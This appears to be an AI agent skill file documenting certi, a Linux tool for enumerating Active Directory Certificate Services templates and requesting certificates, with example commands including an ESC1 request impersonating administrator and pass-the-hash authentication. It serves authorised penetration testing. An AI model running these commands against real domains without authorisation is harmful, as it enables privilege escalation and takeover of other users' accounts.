---
name: certi
description: Request certificates from Active Directory Certificate Services (ADCS) and enumerate certificate templates. Use when performing internal penetration testing, Active Directory exploitation, or privilege escalation involving ADCS (similar to Certify but built on Impacket).
---

# certi

## Overview
Certi is a Python-based utility designed to interact with Active Directory Certificate Services (ADCS). It allows users to list certificate templates and request certificates, functioning as a Linux-based alternative to the Certify tool. Category: Exploitation / Active Directory Security.

## Installation (if not already installed)
Assume certi is already installed. If you get a "command not found" error:

```bash
sudo apt update && sudo apt install certi
```

Dependencies: python3, python3-cryptography, python3-impacket.

## Common Workflows

### List all certificate templates
```bash
certi list 'domain.local/user:password@dc01.domain.local'
```

### Request a certificate for the current user
```bash
certi req 'domain.local/user:password@ca-server.domain.local' UserTemplate
```

### Request a certificate as another user (ESC1 exploitation)
```bash
certi req 'domain.local/user:password@ca-server.domain.local' VulnerableTemplate --alt-name administrator
```

### Authenticate using NTLM hashes
```bash
certi list 'domain.local/user@dc01.domain.local' -hashes :aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

## Complete Command Reference

### Global Options
| Flag | Description |
|------|-------------|
| `-h`, `--help` | Show help message and exit |

---

### Subcommand: `list`
Enumerate certificate templates and ADCS information.

**Usage:** `certi list [options] target`

| Flag | Description |
|------|-------------|
| `-debug` | Turn DEBUG output ON |
| `-hashes LMHASH:NTHASH` | NTLM hashes, format is LMHASH:NTHASH |
| `-no-pass` | Don't ask for password (useful for empty passwords or Kerberos) |
| `-k` | Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) |
| `-aesKey hex key` | AES key to use for Kerberos authentication (128 or 256 bits) |
| `-dc-ip ip address` | IP Address of the domain controller |
| `-target-ip ip address` | IP Address of the target machine |
| `-stdout` | Print templates to stdout (default) |
| `-json` | Export templates to JSON format |

---

### Subcommand: `req`
Request a certificate from a Certificate Authority.

**Usage:** `certi req [options] target template`

| Flag | Description |
|------|-------------|
| `template` | Name of the certificate template to request |
| `-debug` | Turn DEBUG output ON |
| `-hashes LMHASH:NTHASH` | NTLM hashes, format is LMHASH:NTHASH |
| `-no-pass` | Don't ask for password |
| `-k` | Use Kerberos authentication |
| `-aesKey hex key` | AES key to use for Kerberos authentication |
| `-dc-ip ip address` | IP Address of the domain controller |
| `-target-ip ip address` | IP Address of the target machine |
| `-ca CA_NAME` | Name of the CA. If not provided, it will be discovered |
| `-alt-name ALT_NAME` | Subject Alternative Name (SAN) to request (e.g., for ESC1) |
| `-out FILENAME` | Base name for the output files (saves .key and .crt) |

## Notes
- The `target` format follows Impacket's standard: `domain/username:password@target-host` or `domain/username@target-host`.
- When using `-k` (Kerberos), ensure your `KRB5CCNAME` environment variable points to a valid TGT.
- This tool is particularly effective for identifying and exploiting misconfigured certificate templates (ESC1, ESC2, etc.) from a non-Windows attack host.